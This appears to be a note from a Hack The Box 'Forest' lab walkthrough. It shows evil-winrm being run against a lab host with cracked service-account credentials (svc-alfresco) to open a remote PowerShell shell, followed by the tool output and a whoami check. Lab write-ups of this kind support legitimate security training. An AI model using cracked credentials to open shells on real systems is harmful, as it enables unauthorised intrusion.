# Using evil-winrm to get shell as svc-alfreso user
Using evil-winrm with cracked credentials in [[Forest_Retired/5 - Loot]] 
```powershell
❯ /home/kali/Downloads/evil-winrm/evil-winrm.rb  -i 10.10.10.161 -u svc-alfresco -p s3rvice

Evil-WinRM shell v3.0

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
htb\svc-alfresco
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>
```
![[Pasted image 20210727160122.png]]
